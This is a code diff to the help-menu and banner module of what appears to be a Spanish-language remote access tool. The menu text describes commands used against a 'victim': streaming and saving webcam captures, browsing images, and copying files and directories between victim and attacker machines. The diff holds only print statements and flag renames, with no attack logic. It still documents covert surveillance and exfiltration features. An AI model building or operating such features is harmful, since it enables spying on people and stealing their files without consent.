@@ -5,6 +5,7 @@ from colorama.ansi import Fore
 init(autoreset=True)
 
 def logo():
+    print(Fore.CYAN   + "(server)")
     print(Fore.BLUE   + "▄▄▄█████▓ ▄████▄   ██▓███   ██▓ ██▓███ ▓██   ██▓")
     print(Fore.BLUE   + "▓  ██▒ ▓▒▒██▀ ▀█  ▓██░  ██▒▓██▒▓██░  ██▒▒██  ██▒")
     print(Fore.YELLOW + "▒ ▓██░ ▒░▒▓█    ▄ ▓██░ ██▓▒▒██▒▓██░ ██▓▒ ▒██ ██░")
@@ -36,6 +37,7 @@ def man():
 
     print(Fore.BLUE + "cap" + Fore.RED + " --> " + Fore.WHITE + "Muestra un video de alguna camara web de la maquina de la victima")
     print(Fore.YELLOW + "\t* -c" + Fore.RED + " --> " + Fore.WHITE + "Especifica la camara que se quiere utilizar")
+    print(Fore.GREEN + "\t+ -s" + Fore.RED + " --> " + Fore.WHITE + "Guarda la foto tomada en el directorio 'pics'")
     print(Fore.MAGENTA + "\tcap -c 0 ~~ cap -c 1")
 
     print(Fore.BLUE + "cd" + Fore.RED + " --> " + Fore.WHITE + "Cambia el directorio de la victima al especificado")
@@ -60,7 +62,7 @@ def man():
     print(Fore.BLUE + "img" + Fore.RED + " --> " + Fore.WHITE + "Se muestra una imagen especificada de la maquina de la victima")
     print(Fore.YELLOW + "\t* -i" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta de la imagen de la victima")
     print(Fore.GREEN + "\t+ -t" + Fore.RED + " --> " + Fore.WHITE + "Sirve para asignar la escala de la imagen")
-    print(Fore.GREEN + "\t+ -r=" + Fore.RED + " --> " + Fore.WHITE + "Elige una imagen del directorio actual de manera aleatoria")
+    print(Fore.GREEN + "\t+ -r" + Fore.RED + " --> " + Fore.WHITE + "Elige una imagen del directorio actual de manera aleatoria")
     print(Fore.GREEN + "\t+ -90" + Fore.RED + " --> " + Fore.WHITE + "Gira la imagen 90 grados")
     print(Fore.GREEN + "\t+ -180" + Fore.RED + " --> " + Fore.WHITE + "Gira la imagen 180 grados")
     print(Fore.GREEN + "\t+ -270" + Fore.RED + " --> " + Fore.WHITE + "Gira la imagen 270 grados")
@@ -70,7 +72,7 @@ def man():
     print(Fore.GREEN + "\t+ -n" + Fore.RED + " --> " + Fore.WHITE + "Cambia el color de la imagen al negativo")
     print(Fore.GREEN + "\t+ -m" + Fore.RED + " --> " + Fore.WHITE + "Efecto espejo")
     print(Fore.GREEN + "\t+ -c" + Fore.RED + " --> " + Fore.WHITE + "Deteccion de bordes con algoritmo Canny")
-    print(Fore.MAGENTA + "\timg -i imagen.jpg ~~ img -r= ~~ img -g -i imagen.jpg -t=0.5")
+    print(Fore.MAGENTA + "\timg -i imagen.jpg ~~ img -r ~~ img -g -i imagen.jpg -t=0.5 ~~ img -ynm -i imagen.jpg")
 
     print(Fore.BLUE + "lendir" + Fore.RED + " --> " + Fore.WHITE + "Muestra al numero de elementos de un directorio")
     print(Fore.MAGENTA + "\tlendir dirPath")
@@ -92,28 +94,28 @@ def man():
     print(Fore.MAGENTA + "\tsave whoami")
 
     print(Fore.BLUE + "sdf" + Fore.RED + " --> " + Fore.WHITE + "Envia los archivos de un directorio de la victima al atacante")
-    print(Fore.YELLOW + "\t* -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio origen de la maquina de la victima")
-    print(Fore.GREEN + "\t+ -d" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio destino de la maquina del atacante")
-    print(Fore.GREEN + "\t+ -i" + Fore.RED + " --> " + Fore.WHITE + "Indica el indice desde el que se quiere iniciar al envio de archivos")
-    print(Fore.GREEN + "\t+ -a=" + Fore.RED + " --> " + Fore.WHITE + "Indica si se quieren enviar los archivos de forma automatica")
-    print(Fore.MAGENTA + "\t sdf -o directorioOrigen ~~ sdf -a= -o dirOrigen -d dirDestino -i=4")
+    print(Fore.YELLOW + "\t* -i" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio origen de la maquina de la victima")
+    print(Fore.GREEN + "\t+ -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio destino de la maquina del atacante")
+    print(Fore.GREEN + "\t+ -p" + Fore.RED + " --> " + Fore.WHITE + "Indica el indice desde el que se quiere iniciar al envio de archivos")
+    print(Fore.GREEN + "\t+ -a" + Fore.RED + " --> " + Fore.WHITE + "Indica si se quieren enviar los archivos de forma automatica")
+    print(Fore.MAGENTA + "\t sdf -i directorioOrigen ~~ sdf -a -i dirOrigen -o dirDestino -p=4")
 
     print(Fore.BLUE + "sdt" + Fore.RED + " --> " + Fore.WHITE + "Envia los archivos de un directorio del atacante a la victima")
-    print(Fore.YELLOW + "\t* -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio origen de la maquina del atacante")
-    print(Fore.GREEN + "\t+ -d" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio destino de la maquina de la victima")
-    print(Fore.GREEN + "\t+ -i" + Fore.RED + " --> " + Fore.WHITE + "Indica el indice desde el que se quiere iniciar al envio de archivos")
-    print(Fore.GREEN + "\t+ -a=" + Fore.RED + " --> " + Fore.WHITE + "Indica si se quieren enviar los archivos de forma automatica")
-    print(Fore.MAGENTA + "\t sdf -o directorioOrigen ~~ sdf -a= -o dirOrigen -d dirDestino -i=4")
+    print(Fore.YELLOW + "\t* -i" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio origen de la maquina del atacante")
+    print(Fore.GREEN + "\t+ -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio destino de la maquina de la victima")
+    print(Fore.GREEN + "\t+ -p" + Fore.RED + " --> " + Fore.WHITE + "Indica el indice desde el que se quiere iniciar al envio de archivos")
+    print(Fore.GREEN + "\t+ -a" + Fore.RED + " --> " + Fore.WHITE + "Indica si se quieren enviar los archivos de forma automatica")
+    print(Fore.MAGENTA + "\t sdf -i directorioOrigen ~~ sdf -a -i dirOrigen -o dirDestino -p=4")
 
     print(Fore.BLUE + "sff" + Fore.RED + " --> " + Fore.WHITE + "Envia un archivo de la victima al atacante")
-    print(Fore.YELLOW + "\t* -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta del archivo de la victima")
-    print(Fore.GREEN + "\t+ -d" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta destino en la maquina del atacante (si no se agrega este parametro, el nombre del archivo se mantiene igual)")
-    print(Fore.MAGENTA + "\tsff -o origen.txt ~~ sff -o origen.txt -d destino.txt")
+    print(Fore.YELLOW + "\t* -i" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta del archivo de la victima")
+    print(Fore.GREEN + "\t+ -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta destino en la maquina del atacante (si no se agrega este parametro, el nombre del archivo se mantiene igual)")
+    print(Fore.MAGENTA + "\tsff -i origen.txt ~~ sff -i origen.txt -o destino.txt")
 
     print(Fore.BLUE + "sft" + Fore.RED + " --> " + Fore.WHITE + "Envia un archivo del atacante a la victima")
-    print(Fore.YELLOW + "\t* -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta del archivo del atacante")
-    print(Fore.GREEN + "\t+ -d" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta de destino en la maquina de la victima (si no se agrega este parametro, el nombre del archivo no cambia)")
-    print(Fore.MAGENTA + "\tsft -o origen.txt ~~ sft -o origen.txt -d destino.txt")
+    print(Fore.YELLOW + "\t* -i" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta del archivo del atacante")
+    print(Fore.GREEN + "\t+ -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta de destino en la maquina de la victima (si no se agrega este parametro, el nombre del archivo no cambia)")
+    print(Fore.MAGENTA + "\tsft -i origen.txt ~~ sft -i origen.txt -o destino.txt")
 
     print(Fore.BLUE + "unzip" + Fore.RED + " --> " + Fore.WHITE + "Decomprime un archivo .zip")
     print(Fore.YELLOW + "\t* -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica el archivo .zip de origen")
